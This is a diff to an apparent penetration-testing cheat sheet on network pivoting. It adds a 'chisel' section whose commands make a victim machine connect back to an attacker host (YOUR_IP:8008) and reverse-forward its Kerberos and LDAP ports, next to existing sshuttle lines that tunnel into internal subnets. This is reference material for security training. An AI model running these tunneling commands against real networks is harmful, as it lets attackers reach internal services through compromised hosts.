@@ -11,6 +11,7 @@
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
 * [Metasploit](#metasploit)
 * [sshuttle](#sshuttle)
+* [chisel](#chisel)
 * [Rpivot](#rpivot)
 * [plink](#plink)
 * [ngrok](#ngrok)
@@ -140,6 +141,17 @@ route flush
 ```powershell
 sshuttle -vvr user@10.10.10.10 10.1.1.0/24
 sshuttle -vvr username@pivot_host 10.2.2.0/24 
+```
+
+## chisel
+
+
+```powershell
+go get -v github.com/jpillora/chisel
+
+# forward port 389 and 88 to hacker computer
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
 ```
 
 ## Rpivot
